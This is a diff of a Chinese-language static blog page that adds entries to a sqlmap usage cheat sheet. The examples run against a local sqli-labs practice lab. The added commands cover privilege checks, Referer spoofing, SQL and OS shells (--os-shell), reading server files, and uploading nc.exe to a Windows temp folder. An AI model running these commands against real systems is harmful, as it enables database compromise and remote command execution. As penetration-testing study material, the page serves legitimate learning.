@@ -15,7 +15,7 @@
 <meta property="og:description" content="sqlmap">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-06-08T17:58:00.000Z">
-<meta property="article:modified_time" content="2020-06-09T11:52:22.602Z">
+<meta property="article:modified_time" content="2020-06-14T12:14:28.216Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="sqlmap">
 <meta name="twitter:card" content="summary">
@@ -116,6 +116,22 @@
 </li>
 <li><p>获取当前网站的数据库的用户名称<br>sqlmap.py -u “目标URL” –current-user</p>
 </li>
+<li><p>设置探测等级<br>–level 1-5      (数字越大，探测越仔细，但同时运行速度也越慢，默认为1,GET和POST的数据在任何等级都会测试，2探测HTTP cookie,3探测HTTP User-agent/Referer头)<br>ex:sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> –level 5</p>
+</li>
+<li><p>检测当前用户是否为管理员权限<br>–is-dba<br>ex:sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> –is-dba</p>
+</li>
+<li><p>列出数据库用户的角色（权限,比如update,insert,select,delete…)<br>–roles<br>ex:sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> –roles</p>
+</li>
+<li><p>伪造HTTP中的referer头(当–level&gt;=3时，会尝试对referer注入，此时可用该命令去进行欺骗)<br>–referer url   (该命令须配合–level使用)<br>ex:–referer <a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a></p>
+</li>
+<li><p>运行自定义SQL语句<br>–sql-shell<br>ex:sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> –sql-shell</p>
+</li>
+<li><p>运行任意操作系统命令<br>–os-cmd,–os-shell<br>ex:sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> –os-shell </p>
+</li>
+<li><p>从数据库服务器中读取文件(文本文件或者二进制文件)<br>–file-read<br>ex:sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> –file-read “C:/nc.exe” -v 1</p>
+</li>
+<li><p>上传本地文件到数据库服务器中<br>–file-write “本地文件路径”<br>–file-dest “写入路径”<br>ex:sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> –file-write ‘C:/nc.exe’ –file-dest ‘C:/WINDOWS/Temp/nc.exe’ -v 1</p>
+</li>
 </ol>
 
       
@@ -155,7 +171,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Categories</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python-requests/">python(requests)</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/sqlmap/">sqlmap</a></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SRC%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">SRC逻辑漏洞</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python-requests/">python(requests)</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/sqlmap/">sqlmap</a></li></ul>
     </div>
   </div>
 
@@ -165,7 +181,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/python-requests/" rel="tag">python(requests)</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SRC%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" rel="tag">SRC逻辑漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python-requests/" rel="tag">python(requests)</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a></li></ul>
     </div>
   </div>
 
@@ -175,7 +191,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/python-requests/" style="font-size: 10px;">python(requests)</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a>
+      <a href="/tags/SRC%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">SRC逻辑漏洞</a> <a href="/tags/python-requests/" style="font-size: 10px;">python(requests)</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a>
     </div>
   </div>
 
@@ -195,6 +211,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2020/06/14/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%80%A7%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/">一次性验证码绕过</a>
+          </li>
         
           <li>
             <a href="/2020/06/10/requests/">python之requests模块学习</a>
